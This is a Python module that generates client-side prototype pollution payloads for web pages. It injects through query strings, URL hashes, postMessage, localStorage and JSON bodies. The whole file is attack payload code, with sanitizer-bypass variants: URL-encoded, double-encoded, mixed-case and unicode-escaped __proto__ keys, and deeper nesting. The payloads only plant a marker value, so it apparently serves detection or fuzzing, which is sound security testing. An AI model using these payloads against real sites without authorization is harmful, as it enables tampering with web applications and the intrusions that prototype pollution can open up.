"""
Client-side prototype pollution payload generator.

Generates injection payloads across multiple encodings/bracket styles so
"bypasses" of naive sanitizers/parsers are covered. Each payload is paired
with a unique marker key so results from different payloads never collide.
"""

import random
import string
import urllib.parse


def random_marker(prefix: str = "ppf") -> str:
    """Generate a unique marker key, e.g. ppf_a1b2c3d4."""
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}_{suffix}"


class Payload:
    def __init__(self, name: str, build, description: str = ""):
        self.name = name
        self.build = build  # callable(marker, value) -> str (query-string fragment or dict)
        self.description = description

    def __repr__(self):
        return f"<Payload {self.name}>"


def _double_encode(s: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def _unicode_escape_key(key: str) -> str:
    # Escapes each char of __proto__ as \u00XX form, browsers/JS engines that
    # decode unicode escapes in property access may still resolve it.
    return "".join(f"\\u{ord(c):04x}" for c in key)


def build_query_payloads(marker: str, value: str = "polluted"):
    """
    Returns a list of (payload_name, query_string) tuples to append/merge
    into a target URL's query string.
    """
    payloads = []

    # 1. Plain __proto__ bracket
    payloads.append((
        "proto_bracket_plain",
        f"__proto__[{marker}]={value}"
    ))

    # 2. constructor.prototype bracket
    payloads.append((
        "constructor_prototype_bracket",
        f"constructor[prototype][{marker}]={value}"
    ))

    # 3. constructor.prototype dot notation
    payloads.append((
        "constructor_prototype_dot",
        f"constructor.prototype.{marker}={value}"
    ))

    # 4. Array-style nested proto
    payloads.append((
        "array_proto_bracket",
        f"a[__proto__][{marker}]={value}"
    ))

    # 5. Nested depth (3 levels) - some parsers only strip first level
    payloads.append((
        "nested_proto_depth3",
        f"a[b][__proto__][{marker}]={value}"
    ))

    # 6. URL-encoded underscores: %5f%5fproto%5f%5f
    enc = urllib.parse.quote("__proto__")
    payloads.append((
        "proto_url_encoded",
        f"{enc}[{marker}]={value}"
    ))

    # 7. Double URL-encoded
    denc = _double_encode("__proto__")
    payloads.append((
        "proto_double_encoded",
        f"{denc}[{marker}]={value}"
    ))

    # 8. Mixed case (some case-insensitive filters miss this)
    payloads.append((
        "proto_mixed_case",
        f"__PROTO__[{marker}]={value}"
    ))

    # 9. Prototype via constructor, URL encoded brackets
    payloads.append((
        "constructor_prototype_encoded_brackets",
        f"constructor{urllib.parse.quote('[')}prototype{urllib.parse.quote(']')}"
        f"{urllib.parse.quote('[')}{marker}{urllib.parse.quote(']')}={value}"
    ))

    return payloads


def build_json_payloads(marker: str, value: str = "polluted"):
    """
    Returns a list of (payload_name, dict) for payloads a page might send as
    a JSON body via fetch/XHR, or that we try to inject if the page
    deserializes location.hash / postMessage data as JSON.
    """
    payloads = []

    payloads.append(("json_proto_simple", {"__proto__": {marker: value}}))
    payloads.append(("json_constructor_prototype", {"constructor": {"prototype": {marker: value}}}))
    payloads.append(("json_nested_proto", {"a": {"__proto__": {marker: value}}}))
    # unicode-escaped key as raw JSON text (must be built as string, not dict,
    # since Python dict can't hold a literal unicode-escape key form)
    payloads.append((
        "json_proto_unicode_escape_raw",
        '{"\\u005f\\u005fproto\\u005f\\u005f":{"%s":"%s"}}' % (marker, value)
    ))

    return payloads


def build_hash_payloads(marker: str, value: str = "polluted"):
    """Payloads for location.hash-based parsing (e.g. hash router configs)."""
    # Hash payloads mirror query payloads since many client libs parse
    # location.hash.substring(1) with the same query-string parser.
    return build_query_payloads(marker, value)


def build_postmessage_payloads(marker: str, value: str = "polluted"):
    """
    Returns a list of (payload_name, message_object) to send via
    window.postMessage to the target frame.
    """
    payloads = []
    payloads.append(("postmessage_proto_simple", {"__proto__": {marker: value}}))
    payloads.append(("postmessage_constructor_prototype", {"constructor": {"prototype": {marker: value}}}))
    payloads.append(("postmessage_nested", {"data": {"__proto__": {marker: value}}}))
    return payloads


def build_localstorage_payloads(marker: str, value: str = "polluted"):
    """
    Returns (payload_name, key, value_json_string) tuples to seed
    localStorage before page/script re-parses stored JSON.
    """
    payloads = []
    payloads.append((
        "localstorage_proto_json",
        "state",
        '{"__proto__":{"%s":"%s"}}' % (marker, value)
    ))
    payloads.append((
        "localstorage_constructor_prototype_json",
        "config",
        '{"constructor":{"prototype":{"%s":"%s"}}}' % (marker, value)
    ))
    return payloads


INJECT_POINTS = {
    "query": build_query_payloads,
    "hash": build_hash_payloads,
    "postmessage": build_postmessage_payloads,
    "localstorage": build_localstorage_payloads,
    "json": build_json_payloads,
}
